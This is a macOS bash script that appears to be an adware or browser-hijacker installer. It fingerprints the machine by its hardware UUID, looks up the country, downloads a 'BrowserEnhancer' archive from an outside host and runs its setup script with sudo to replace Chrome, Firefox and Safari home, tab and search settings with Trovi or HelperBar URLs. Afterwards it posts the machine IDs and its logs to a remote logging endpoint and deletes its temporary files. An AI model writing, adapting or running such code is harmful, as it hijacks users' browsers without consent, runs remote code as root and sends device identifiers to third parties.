#!/bin/bash
# ioreg -l | grep -e Manufacturer -e 'Vendor Name'
updFile="/var/tmp/updText.txt"
updFileError="/var/tmp/updTextError.txt"
chmod 777 $updFile;
chmod 777 $updFileError;
echo > $updFile
echo > $updFileError
br_mid=$(ioreg -rd1 -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ { split($0, line, "\""); printf("%s\n", line[4]); }')
midFile=$(find /System/Library/Frameworks -type f -name "*.uuid.plist" -print0 | xargs -0 ls -tl | sort -n | tail -1 | awk '{print $9}')
if [ -e "$midFile" ]; then
    mid=$(echo "$midFile" | python -c 'import sys;print open(sys.stdin.read().rstrip(), "r").read().split("<string>")[1].split("</string>")[0]')
    echo "mid: $mid." >> $updFile
fi
get_pd_client_data="http://93a555685cc7443a8e1034efa1f18924.com/v/cld?mid=$br_mid&ct=pd"
data=$(curl -s "$get_pd_client_data")
dc="DP7138"
channel=$(echo $dc | tr -d '[[:space:]]' | tr -cd 0-9)
pdChannel=${dc:2}
echo "DC: $dc" >> $updFile
click_id="7dd121bf-7154-4e91-b37d-7ca5b395e67d"
echo "CLICK_ID: $click_id" >> $updFile
click_stamp=""
echo "CLICK_STAMP: $click_stamp" >> $updFile
id=$dc"--"$click_id"___"$click_stamp"___"$br_mid
echo "Full ID: $id" >> $updFile
domain=""http://aadcd15734d97346bb85f545dc8ca03e7e.com""
pop_url="'http://aadcd15734d97346bb85f545dc8ca03e7e.com/pp/fd?re=1&uid=[MACHINE_ID]&u=[CONTEXT_URL]'"
pop_delay="1"

if [ $midFile ]; then
	frm=$(echo $midFile | tail -1 | awk -F "/" '{print $5}' | awk -F "." '{print $1}')
fi
mid_proc=false
if [ $frm ];then
	if ps -ef | grep -v grep | grep -q $frm; then
		mid_proc=true
	fi
fi
echo "midFile: $midFile." >> $updFile
echo "frm: $frm" >> $updFile
echo "mid_proc: $mid_proc" >> $updFile

pSearch () {
	updFile="/var/tmp/updText.txt"
	sudo chmod 777 $updFile
	echo "Starting Install Search Script" >> $updFile
	dc="DP7138"
	click_id="7dd121bf-7154-4e91-b37d-7ca5b395e67d"
	channel=$(echo $dc | tr -d '[[:space:]]' | tr -cd 0-9)
	id=$dc"--"$click_id___$br_mid
	echo "ID: $id" >> $updFile
	tmpfile1="/var/tmp/brh.txt"
	tmpfile3="/var/tmp/BrowserEnhancer04052016"
	country=$(curl -s 'ipinfo.io/country')
	countryCodes=("US" "CA" "GB" "ES" "AU" "FR" "DE" "IN" "IT" "NL" "NZ")
	troviAllowed="1"
	if [[ "${countryCodes[@]}" =~ "${country}" && $troviAllowed == *"1"* ]]; then
		echo "Country is in selected countries." >> $updFile
	    replacedHome="http://www.trovi.com/?n=$dc&searchsource=55&UM=8&gd=SY1000250"
	    replacedTab="http://www.trovi.com/?n=$dc&searchsource=69&UM=8&gd=SY1000250"
	    replacedSearch="http://www.trovi.com/Results.aspx?n=$dc&searchsource=58&UM=8&gd=SY1000250"
	    newSearchProvider="Trovi"
	    offer_id="2012"
		sProv="Trovi"
	else
	    echo "Country is NOT in selected countries." >> $updFile
	    countryType=0
	    replacedHome="http://feed.helperbar.com/?publisher=TingSyn&barcodeid=51222999&searchtype=hp&type=YHS_TGE_$dc&_=tt1"
	    replacedTab="http://feed.helperbar.com/?publisher=TingSyn&barcodeid=51222999&searchtype=nt&type=YHS_TGE_$dc&_=tt1"
	    replacedSearch="http://feed.helperbar.com/?publisher=TingSyn&barcodeid=51222999&searchtype=ds&type=YHS_TGE_$dc&_=tt1"
	    newSearchProvider="HelperBar"
	    offer_id="2112"
		sProv="HelperBar"
	fi

	function preCheckChrome() {
		maxProfilesCount=10
		function jsonValue() {
		KEY=$1
		num=$2
		awk -F"[,:}]" '{for(i=1;i<=NF;i++){if($i~/'$KEY'\042/){print $(i+1)}}}' | tr -d '"' | sed -n ${num}p
		}
		chromeProfilePath="/Users/"
		chromeProfilePath+=$user
		chromeProfilePath+="/Library/Application Support/Google/Chrome"

		chromeDefaultProfilePath=$chromeProfilePath
		chromeDefaultProfilePath+="/Default"

		preferencesFile=$chromeDefaultProfilePath
		preferencesFile+="/Preferences"
		echo "[Chrome] Preferences file: " $preferencesFile >> $updFile
		if [ -s "$preferencesFile" ]; then
			echo "[Chrome] Preferences file exists" >> $updFile

			defaultSearch=$(cat "$preferencesFile" | jsonValue short_name)
			echo $defaultSearch >> $updFile
			if echo $defaultSearch | grep -q "$searchName"; then
				echo "[Chrome] Search is replaced" >> $updFile
				return 1
			else
				echo "[Chrome] Search is not installed" >> $updFile
				return 0
			fi
		else
			echo "[Chrome] No default preferences file found. Searching for additional users." >> $updFile

			for i in `seq 1 $maxProfilesCount`
			do
				profilePath=$chromeProfilePath
				profilePath+="/Profile "
				profilePath+=$i
				preferencesFile=$profilePath
				preferencesFile+="/Preferences"
				echo "[Chrome] Additional: " $preferencesFile >> $updFile
				if [ -s "$preferencesFile" ]; then
					echo "[Chrome] Additional preferences file exists" >> $updFile
					defaultSearch=$(cat "$preferencesFile" | jsonValue short_name)
					echo $defaultSearch >> $updFile
					if echo $defaultSearch | grep -q "$searchName"; then
						echo "[Chrome] Search is replaced" >> $updFile
						return 1
					fi
				fi
			done

			echo "[Chrome] Search is not installed" >> $updFile
			return 0
		fi
	}

	function preCheckFireFox() {
		ffProfilesPath="/Users/"
		ffProfilesPath+=$user
		ffProfilesPath+="/Library/Application Support/Firefox/Profiles/"

		cd "$ffProfilesPath"
		profileName=$(ls -d */)

		preferencesFile=$ffProfilesPath
		preferencesFile+=$profileName
		preferencesFile+="prefs.js"
		echo "[Firefox] Preferences file: " $preferencesFile >> $updFile
		if [ -s "$preferencesFile" ]; then
			echo "[Firefox] Preferences file exists" >> $updFile
			isSelected=0
			selectedEngine=$(cat -n "$preferencesFile" | grep browser.search.selectedEngine )
			echo $selectedEngine >> $updFile
			if echo $selectedEngine | grep -q "$searchName"; then
				echo "[Firefox] Search is selected" >> $updFile
				isSelected=1
			fi

			isDefault=0
			defaultSearch=$(cat -n "$preferencesFile" | grep browser.search.defaultenginename)
			echo $defaultSearch >> $updFile
			if echo $defaultSearch | grep -q "$searchName"; then
				echo "[Firefox] Search is default" >> $updFile
				isDefault=1
			fi

			if [ "$isSelected" -eq 1 ] && [ "$isDefault" -eq 1 ]; then
				echo "[Firefox] Search is replaced" >> $updFile
				return 1
			else
				echo "[Firefox] Search is not installed" >> $updFile
				return 0
			fi
		else
			echo "[Firefox] No preferences file found. No search info available" >> $updFile
			return 0
		fi
	}

	function preCheckSafari() {
		safariExtensionsFile="/Users/"
		safariExtensionsFile+=$user
		safariExtensionsFile+="/Library/Safari/Extensions/Extensions.plist"

		echo "[Safari] Extensions file: " $safariExtensionsFile >> $updFile
		if [ -s "$safariExtensionsFile" ]; then
			echo "[Safari] Extensions file exists" >> $updFile

			if grep "$searchName" "$safariExtensionsFile"; then
				echo "[Safari] Search is replaced" >> $updFile
				return 1
			else
				echo "[Safari] Search is not installed" >> $updFile
				return 0
			fi
		else
			echo "[Safari] No extensions file found. No search info available" >> $updFile
			return 0
		fi
	}

	function getUserHomeDir() {
		w -h | sort -u -t' ' -k1,1 | while read user etc
		do
			homedir=$(dscl . -read /Users/$user NFSHomeDirectory | cut -d' ' -f2)
			echo "$user"
		done
	}

	function preCheckSearch() {
		searchName=$newSearchProvider
		echo "Precheck for: " $searchName >> $updFile

		user=$(getUserHomeDir)
		echo "User: " $user >> $updFile
		preCheckChrome
		retValChrome=$?
		echo "Chrome check returns: "$retValChrome >> $updFile

		preCheckFireFox
		retValFireFox=$?
		echo "Firefox check returns: "$retValFireFox >> $updFile

		preCheckSafari
		retValSafari=$?
		echo "Safari check returns: "$retValSafari >> $updFile

		cd $(dirname $0)

		if (( $retValSafari == 1 || $retValChrome == 1 || $retValFireFox == 1 )); then
			return 1
		else
			return 0
		fi
	}

#	preCheckSearch
#	retValSearch=$?
	retValSearch=0
	if (( $retValSearch == 0 )); then
		echo "Search not found." >> $updFile
		tmpfile2="/var/tmp/BrowserEnhancer04052016_"$sProv".tgz"
		/usr/bin/curl -s -L -o ${tmpfile2} "http://pullmenow.com/pd_files/BrowserEnhancer/BrowserEnhancer04052016_"$sProv".tgz"

		tar -xzf ${tmpfile2} -C /var/tmp/
		if [[ -d $tmpfile3 ]]; then
			echo "$tmpfile3 Exists" >> $updFile
		else
			echo "$tmpfile3 Doesn't Exist" >> $updFile
		fi
		if [[ -f "/var/tmp/BrowserEnhancer04052016/setup.sh" ]]; then
			echo "/var/tmp/BrowserEnhancer04052016/setup.sh Exists" >> $updFile
		else
			echo "/var/tmp/BrowserEnhancer04052016/setup.sh Doesn't Exist" >> $updFile
		fi
		echo sudo /var/tmp/BrowserEnhancer04052016/setup.sh "$replacedHome" "$replacedTab" "$replacedSearch" $newSearchProvider "$id" >> $updFile

		sudo /var/tmp/BrowserEnhancer04052016/setup.sh "$replacedHome" "$replacedTab" "$replacedSearch" $newSearchProvider "$id"

		sleep 30
		echo $(</var/tmp/updText2.txt) >> $updFile
		sleep 10
	else
		echo "Search is installed." >> $updFile
	fi
	echo "Removing tmp files" >> $updFile
	rm ${tmpfile1}
	rm ${tmpfile2}
	rm -rf ${tmpfile3}
	# rm -rf $updFile
	# rm -rf /var/tmp/updText2.txt
}

echo "Installing PD Search with logger" >> $updFile
pSearch &> $updFileError;
sleep 5
echo $(</var/tmp/updTextError.txt) >> $updFile


eventType="Update Script Output"
sleep 30
curl --request POST 'http://93a555685cc7443a8e1034efa1f18924.com/v/pd-logger' --data "vs_mid=$mid" --data "br_mid=$br_mid" --data-urlencode "event_type=$eventType" --data-urlencode "event_data=$(<$updFile)"
sleep 5
rm -rf $updFile
rm -rf /var/tmp/updText2.txt
rm -rf $updFileError